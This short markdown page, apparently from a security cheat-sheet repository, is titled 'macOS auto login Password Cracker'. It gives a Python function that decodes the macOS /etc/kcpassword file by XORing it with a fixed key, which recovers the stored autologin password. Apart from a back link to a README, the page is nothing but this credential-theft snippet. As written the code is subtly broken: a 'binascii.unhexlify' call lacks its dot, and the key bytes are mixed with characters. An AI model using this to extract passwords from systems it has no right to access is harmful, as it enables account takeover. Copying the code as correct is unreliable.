# macOS auto login Password Cracker
```
Description: if Mac autologin password file /etc/kcpassword exist
Crack with Python code:

def kcpasswd(ciphertext):
    key = '7d895223d2bcddeaa3b91f'
    while len(key) < (len(ciphertext)*2):
        key = key + key
    key = binasciiunhexlify(key)
    result = ''
    for i in range(len(ciphertext)):
        result += chr(ord(ciphertext[i]) ^ (key[i]))
    return result
```

## Back to README.md
[BACK](/README.md)